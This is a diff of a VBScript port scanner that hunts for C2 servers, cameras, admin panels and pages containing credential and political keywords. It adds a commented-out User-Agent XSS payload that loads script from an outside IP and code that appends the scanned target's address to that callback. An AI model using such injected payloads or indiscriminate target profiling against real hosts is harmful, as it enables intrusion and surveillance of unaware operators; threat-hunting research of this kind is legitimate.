@@ -1,13 +1,15 @@
 'Flying Monkeyz Port Scanner
 'Author: Rick Cable (CyberAbyss)
-'Version 6.0
+'Version 7.1
 'Released for educational purposes without warranty
 
 'For next update make the script capable of using specific user-agent strings to find hidden command and control servers.
 'Refrence this Sans video on threat hunting
 'https://www.youtube.com/watch?v=GjquFKa4afU&ab_channel=SANSDigitalForensicsandIncidentResponse
 'This one is suspect,might be hacker group: Dectected: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:79.0) Gecko/20100101 Firefox/79.0
-strUserAgent = "Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1"
+'We can also put payloads in the user Agent. This one phones home.
+'strUserAgent = "<script src=http://45.79.224.213></script>"
+strUserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)"
 
 
 ON ERROR RESUME NEXT
@@ -58,8 +60,13 @@ hitCounter = 0 		'Counts how many finds we've had, if 0 just delete the file at 
 logOnEvery = 100
 'Example shows 10 * 10000 form miliseconds to seconds
 httpTimeout = 500
-'commonPortsList = "80,8080,8081,81,88,443,1024,1337,1000,2000,3000,4000,4550,5000,5150,5160,5511,5554,6000,6036,6550,7000,8000,8080,8082,8090,8866,9000,10000,32400,554,555,1024,1337,4840,7447,8554,7070,10554,6667,8081,8090,9100,9200,19999,50000,56000"
-commonPortsList = "80,8080,8081,8000"
+'Long Port List
+'commonPortsList = "80,81,82,88,8080,8081,1024,1337,1000,2000,3000,4000,4550,5000,5150,5160,5511,5554,6000,6036,6550,7000,8000,8082,8090,8866,9000,10000,32400,554,555,1024,1337,4840,7447,8554,7070,10554,6667,8090,9100,9200,19999,40056,50000,56000"
+'Short Port List Havoc C2 default port is 40056
+'commonPortsList = "80,8080"
+commonPortsList = "80,81,8080,40056"
+'Common IP Camera and Security Camera IPs
+'commonPortsList = "80,81,82,6036,7000,5554,8080,8081,8082,5150,5160,4550,5511,5550,6550,8866,56000,10000,40056"
 arrCommonPorts = split(commonPortsList,",")
 'Common target types
 'تلگرام is Telegram in Persian
@@ -72,7 +79,7 @@ arrCommonPorts = split(commonPortsList,",")
 '没有找到站点 is Site Not Found in Chinese
 '若您的浏览器无法跳转 is If your browser cannot jump in Chinese
 strChinesePhrases = "没有找到站点,若您的浏览器无法跳转"
-strTargetTypes = "Telgram.js,Account-Suspended,Website-Unavailable,Cobalt Strike,Metasploit,Sliver,Havoc,Hak5 Cloud C²,Hak5 Cloud,Hak5 , C² ,XSSez,XSS Hunter,XSStrike,XSSER,Acunetix,Burp Suite,Intruder,Dalfox,The Hunted,China Chopper,LOKI,/admin,/backup,INSTAR Full-HD IP-Camera,impulse CRM,bitrix,D-Link,live-video,PACS,U.Tel-G242,TP-LINK,WEB Management System,main-video,Caddy works,FASTPANEL,Icecast,Burp Collaborator Server,Connection denied by Geolocation Setting,pfsense,Rebellion,Lua Configuration Interface,WAMPSERVER homepage,webcamXP 5,Your server is now running,Synology,relay for the Tor Network,TURN Server,Filemaker,Directory listing for,AutoSMTP,PowerMTA,Adminer,Wowza Media Server,Wowza Streaming Engine,Tor Exit Server,DD-WRT Control Panel,database,DB,Blue Iris,SCADA,Swagger UI,SmarterMail,Keycloak,OctoPos,blog,docker,Nginx Proxy Manager,phpMyAdmin,patriot,antifa,communist,communism,socialist,workers party,Looking Glass Point,Plesk,OoklaServer,Nagios,HTTP Parrot,Welcome to CentOS,Index of,payment method,listing:,Client sent an HTTP request to an HTTPS server,Ruby on Rails,FreePBX,Tor Exit Router,The Shadowserver Foundation,Georgia Institute of Technology,CentOS-WebPanel,PHP Version,luxteb,popper.js,Nexus Repository Minecraft Server,patriot,antifa,communist,communism,socialist,Islam,Jihad,workers party,Aryan,nazi,anarcist,Anarchism,Tor Exit Router,hacker,hacking,hacked,hack,hospital ,ISPmanager,defaultwebpage.cgi,.asp?,index.js,500 Internal Server Error,IIS,Apache,Swagger Editor,Node Exporter,Plone,webcam,webcamXP,Webmail,redirect_suffix,NextFiber Monitoring,Nexcess,nginx,router configuration,Network Security Appliance,Admin Panel,IKCard Web Mail,Amazon ECS,Unknown Domain,Lucee,ZITADEL • Console,OpenResty,NETSurveillance,WEB SERVICE,Bootstrap Theme,Coming Soon,Droplet,Your new web server,تلگرام,ASP.NET,Video Collection,Wowza Streaming Engine,You need to enable JavaScript,Пустая страница,торрент трекер,CTF platform,qBittorrent,Shared IP,webui,XFINITY,Calix Home Gateway,money-saving offers,laravel,ListAllMyBucketsResult,Cloudflare network,LeakIX scanning network,secret,APIKey,Payment,Login,Site Not Found,report,Lorem ipsum,Page not found, NAS ,Manager,content is to be added,password:,password=,username=,document.location.href," & strChinesePhrases
+strTargetTypes = "window.open,Telgram.js,Account-Suspended,Website-Unavailable,Cobalt Strike,Metasploit,Sliver,Havoc,Hak5 Cloud C²,Hak5 Cloud,Hak5 , C² ,XSSez,XSS Hunter,XSStrike,XSSER,Acunetix,Burp Suite,Intruder,Dalfox,The Hunted,China Chopper,LOKI,/admin,/backup,INSTAR Full-HD IP-Camera,impulse CRM,bitrix,D-Link,live-video,PACS,U.Tel-G242,TP-LINK,WEB Management System,main-video,Caddy works,FASTPANEL,Icecast,Burp Collaborator Server,Connection denied by Geolocation Setting,pfsense,Rebellion,Lua Configuration Interface,WAMPSERVER homepage,webcamXP 5,Your server is now running,Synology,relay for the Tor Network,TURN Server,Filemaker,Directory listing for,AutoSMTP,PowerMTA,Adminer,Wowza Media Server,Wowza Streaming Engine,Tor Exit Server,DD-WRT Control Panel,database,DB,Blue Iris,SCADA,Swagger UI,SmarterMail,Keycloak,OctoPos,blog,docker,Nginx Proxy Manager,phpMyAdmin,patriot,antifa,communist,communism,socialist,workers party,Looking Glass Point,Plesk,OoklaServer,Nagios,HTTP Parrot,Welcome to CentOS,Index of,payment method,listing:,Client sent an HTTP request to an HTTPS server,Ruby on Rails,FreePBX,Tor Exit Router,The Shadowserver Foundation,Georgia Institute of Technology,CentOS-WebPanel,PHP Version,luxteb,popper.js,Nexus Repository Minecraft Server,patriot,antifa,communist,communism,socialist,Islam,Jihad,workers party,Aryan,nazi,anarcist,Anarchism,Tor Exit Router,hacker,hacking,hacked,hack,hospital ,ISPmanager,defaultwebpage.cgi,.asp?,index.js,500 Internal Server Error,IIS,Apache,Swagger Editor,Node Exporter,Plone,webcam,webcamXP,Webmail,redirect_suffix,NextFiber Monitoring,Nexcess,nginx,router configuration,Network Security Appliance,Admin Panel,IKCard Web Mail,Amazon ECS,Unknown Domain,Lucee,ZITADEL • Console,OpenResty,NETSurveillance,WEB SERVICE,Bootstrap Theme,Coming Soon,Droplet,Your new web server,تلگرام,ASP.NET,Video Collection,Wowza Streaming Engine,You need to enable JavaScript,Пустая страница,торрент трекер,CTF platform,qBittorrent,Shared IP,webui,XFINITY,Calix Home Gateway,money-saving offers,laravel,ListAllMyBucketsResult,Cloudflare network,LeakIX scanning network,secret,APIKey,Payment,Login,Site Not Found,report,Lorem ipsum,Page not found, NAS ,Manager,content is to be added,password:,password=,username=,document.location.href," & strChinesePhrases
 
 'strTargetTypes = "index of,Cobalt Strike,Metasploit,Sliver,Havoc,Hak5 Cloud C²,Hak5 Cloud,Hak5 , C² ,Hak5,XSSez,XSS Hunter,XSStrike,XSSER,Acunetix,Burp Suite,Intruder,Dalfox,DB , DB,database,Icecast,Burp Collaborator Server,Burp,pfsense,relay for the Tor Network,Tor Exit Server,control panel,admin panel,patriot,antifa,communist,communism,socialist,workers party,Tor Exit Router,hacker,hacking,hacked,hack ,CTF,Cyber,report,jenkins"
 
@@ -83,7 +90,7 @@ arrTargetTypes = Split(strTargetTypes,",")
 doWeScrapeContent = true
 strDoNotScrapeList = "Grafana,WEB Management System,NETSurveillance,WEB SERVICE,router configuration,Caddy works,FASTPANEL,Lua Configuration Interface,400 Bad Request,PHP Version,Network Security Appliance,Your server is now running,phpMyAdmin,AutoSMTP,Cloudflare network,nginx,laravel,CentOS-WebPanel,IIS,qBittorrent,Apache,Node Exporter,Shared IP,Droplet,Coming Soon,webui,defaultwebpage.cgi,money-saving offers,Plesk,Unknown Domain,Your new web server,Welcome to CentOS,没有找到站点,没有找到站点,Nginx Proxy Manager,document.location.href," & strChinesePhrases
 
-strInterestingItems = "torrent,movies,.mkv,.mp4,.mp3,downloads"
+strInterestingItems = "torrent,movies,.mkv,.mp4,.mp3,downloads,HDCAM,.x264"
 arrInterestingItems = split(strInterestingItems,",")
 
 arrDoNotScrapeList = Split(strDoNotScrapeList,",")
@@ -221,8 +228,12 @@ Function isWebsiteOffline(strURL)
 	http.setTimeouts lResolve, lConnect, lSend, lReceive
 	 	'Set http = CreateObject("Microsoft.XmlHttp")
 	http.open "GET", strURL, False
+	strUserAgentTemp = Replace(strUserAgent,".213",".213?ip=" & Replace(strURL,"http://",""))
+	'msgbox(strUserAgentTemp)
 	http.setRequestHeader "User-Agent", strUserAgent  
 	http.send ""
+	strUserAgentTemp = ""
+	
 	
 	CheckForFTP = false
 
